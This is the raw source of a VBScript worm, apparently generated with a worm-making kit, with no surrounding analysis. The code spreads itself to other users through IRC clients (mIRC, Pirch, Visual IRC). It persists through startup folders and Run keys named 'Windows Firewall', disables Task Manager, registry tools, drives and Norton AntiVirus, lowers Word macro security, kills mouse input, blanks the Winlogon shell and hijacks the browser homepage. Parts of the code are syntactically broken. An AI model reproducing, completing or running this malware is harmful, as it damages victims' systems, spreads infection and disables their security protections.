On Error Resume Next

' crystalfire By cosmic V0.1
'Generated With OXY'S INTERNET WORM MAKER THING 1.1 BETA
Dim x
set fso=CreateObject("Scripting.FileSystemObject")
set x=fso.CreateTextFile("C:\mirc\script.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\cosmicvbs", True
x.WriteLine "[script]"
x.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\mirc\cosmic }
x.Close
Dim pirch
set fso=CreateObject("Scripting.FileSystemObject")
set mirc=fso.CreateTextFile("C:\pirch98\events.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\cosmic.vbs", True
pirch.WriteLine "[Levels]");
pirch.WriteLine "Enabled=1");
pirch.WriteLine "Count=6");
pirch.WriteLine "Level1=000-Unknows"
pirch.WriteLine "000-UnknowsEnabled=1"
pirch.WriteLine "Level2=100-Level 100"
pirch.WriteLine "100-Level 100Enabled=1"
pirch.WriteLine "Level3=200-Level 200"
pirch.WriteLine "200-Level 200Enabled=1"
pirch.WriteLine "Level4=300-Level 300"
pirch.WriteLine "300-Level 300Enabled=1"
pirch.WriteLine "Level5=400-Level 400"
pirch.WriteLine "400-Level 400Enabled=1"
pirch.WriteLine "Level6=500-Level 500"
pirch.WriteLine "500-Level 500Enabled=1"
pirch.WriteLine "[000-Unknowns]"
pirch.WriteLine "User1=*!*@*"
pirch.WriteLine "UserCount=1"
pirch.WriteLine "Events1=ON JOIN:#: /dcc send $nick C:\Pirch98\cosmic.vbs"
pirch.WriteLine "EventCount=1"
pirch.WriteLine "[100-Level 100]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[200-Level 200]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[300-Level 300]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[400-Level 400]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[500-Level 500]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.Close
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Virc\cosmic.vbs", True
set shell=CreateObject("WScript.Shell")
shell RegWrite "HKEY_CURRENT_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17", "dcc send $nick C:\Virc\cosmic.vbs"
Dim reg
set fso=CreateObject("Scripting.FileSystemObject")
set path = C:\windows
fso.CopyFile Wscript.ScriptFullName,path
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Windows Firewall", "C:\Windows\logon.vbs", "REG_SZ"
Dim reg
set fso=CreateObject("Scripting.FileSystemObject")
set path = C:\windows
fso.CopyFile Wscript.ScriptFullName,path
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Firewall", "C:\Windows\logon.vbs", "REG_SZ"
set fso=CreateObject("Scripting.FileSystemObject")
set path = C:\Windows\Start Menu\Programs\StartUp\winlogon.exe.vbs
fso.CopyFile Wscript.ScriptFullName,path
set fso=CreateObject("Scripting.FileSystemObject")
set path = C:\Windows\Startmenü\Programme\Autostart\winlogon.exe.vbs
fso.CopyFile Wscript.ScriptFullName,path
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", "67108863", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Control Panel\Accessibility\Keyboard Response\Flags", "127", "REG_SZ"
reg.regwrite "HKCU\Control Panel\Accessibility\SoundSentry\Flags", "3", "REG_SZ"
reg.regwrite "HKCU\Control Panel\Accessibility\SoundSentry\WindosEffect", "3", "REG_SZ"
reg.regwrite "HKLM\SYSTEM\CurrentConrolSet\Services\MouClass\Start", "4", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\SYSTEM\CurrentConrolSet\Services\MouClass\Start", "4", "REG_DWORD"
Msgbox "Your are a history",16,"Divine happiness"

Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",""
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","LOL", "REG_SZ"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganisation","PIG", "REG_SZ"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows\Internet Explorer\Main","www.aebn.com", "REG_SZ"
On Error Resume Next
AutoOff = "."
Set oWMI = GetObject("winmgmts://.")
AutoOffName = "Norton AntiVirus Auto-Protect Service"
sWQL = "Select state from Win32_Service " & "Where displayname='" & AutoOffName & "'"
Set oResults = oWMI.ExecQuery(sWQL)
For Each oService In oResults
oService.StopService
oService.ChangeStartMode("Disabled")
Next
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
 CommandBars("Macro").Controls("Security...").Enabled = False
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
 CommandBars("Tools").Controls("Macro").Enabled = False
 Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun","1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose","1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff","1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind","1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Control Panel\Mouse\SwapMouseButtons","1", "REG_SZ"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Control Panel\Mouse\MouseSpeed","10", "REG_SZ"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title","ShitExplorer", "REG_SZ"
Set objShell = CreateObject( "Wscript.Shell" )
objShell.Run "%windir%\System32\rundll32.exe user32.dll,LockWorkStation" 